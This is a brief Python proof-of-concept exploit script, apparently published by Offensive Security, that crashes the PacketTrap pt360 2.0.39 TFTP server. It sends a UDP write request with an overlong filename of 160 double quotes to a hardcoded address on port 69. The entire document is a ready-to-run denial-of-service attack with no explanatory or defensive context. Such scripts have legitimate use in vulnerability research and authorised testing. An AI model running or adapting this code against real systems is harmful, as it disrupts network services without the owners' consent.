#!/usr/bin/python
# PacketTrap Networks pt360 2.0.39 TFTPD Remote DOS 
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/pt360dos.py.txt

import socket
import sys

host = '172.16.167.134'
port = 69

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
   print "socket() failed"
   sys.exit(1)

filename = '"'*160
mode = "netascii"
muha = "\x00\x02" + filename + "\0" + mode + "\0"
s.sendto(muha, (host, port))

